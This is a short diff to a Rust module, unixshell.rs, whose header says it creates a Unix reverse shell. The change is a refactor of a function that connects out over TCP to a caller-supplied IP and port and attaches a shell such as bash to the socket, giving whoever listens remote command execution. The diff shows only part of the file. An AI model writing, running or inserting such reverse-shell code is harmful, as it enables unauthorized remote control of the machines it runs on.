@@ -3,15 +3,14 @@ Name: unixshell.rs
 Description: Create a unix reverse shell (with bash etc).
 */
 
+use std::io::Result;
 use std::net::TcpStream;
 use std::os::unix::io::{AsRawFd, FromRawFd};
 use std::process::{Command, Stdio};
 
 /* Open A Reverse Shell */
-pub fn shell(ip: String, port: String, shell: String) -> std::io::Result<()> {
-    let full: String = format!("{}:{}", ip, port);
-
-    let sock = TcpStream::connect(full)?;
+pub fn shell(ip: String, port: String, shell: String) -> Result<()> {
+    let sock = TcpStream::connect(format!("{}:{}", ip, port))?;
     let fd = sock.as_raw_fd();
 
     // Open shell
@@ -25,7 +24,7 @@ pub fn shell(ip: String, port: String, shell: String) -> std::io::Result<()> {
 
     println!("Shell exited");
 
-    return Ok(());
+    Ok(())
 }
 
 //todo add windows shell
